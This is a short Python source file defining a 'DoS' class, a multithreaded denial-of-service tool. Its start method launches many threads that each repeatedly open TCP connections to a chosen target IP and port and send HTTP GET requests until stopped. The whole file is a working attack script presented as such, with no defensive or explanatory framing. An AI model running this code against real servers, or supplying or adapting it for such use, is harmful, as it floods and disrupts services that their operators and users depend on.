import socket
import threading


class DoS:
    def __init__(
        self, targetIP: str = "127.0.0.1", targetPort: int = 80, threadNum: int = 25
    ):
        self._ipAddress = socket.gethostbyname(socket.gethostname())

        self.attacking = False
        self.attackNum = 0
        self._threadException = False
        self._threadExceptionMessage = False

        self._targetIP = targetIP
        self._targetPort = targetPort
        self._threads = threadNum

        self.__name__ = "DoS"

    def _attack(self):
        while self.attacking:
            s = socket.socket(
                family=socket.AF_INET, type=socket.SOCK_STREAM, proto=0, fileno=None
            )

            try:
                s.connect((self._targetIP, self._targetPort))
                s.sendto(
                    ("GET / HTTP/1.1\r\n").encode("ascii"),
                    (self._targetIP, self._targetPort),
                )
                s.sendto(
                    (f"Host: {self._ipAddress}\r\n\r\n").encode("ascii"),
                    (self._targetIP, self._targetPort),
                )
            except Exception as e:
                self._threadException = True
                self._threadExceptionMessage = e

            s.close()
            self.attackNum += 1

    def _exceptionCheck(self):
        while self.attacking:
            if self._threadException:
                self.stop()
                self._threadException = False
                raise Exception(self._threadExceptionMessage)

    def start(self):
        self.attacking = True

        for i in range(self._threads):
            attackThread = threading.Thread(target=self._attack)
            attackThread.start()

        exceptionThread = threading.Thread(target=self._exceptionCheck)
        exceptionThread.start()

    def stop(self):
        if self.attacking == False:
            raise Exception("You cannot stop an attack that is not running!")

        self.attacking = False
        self.attackNum = 0
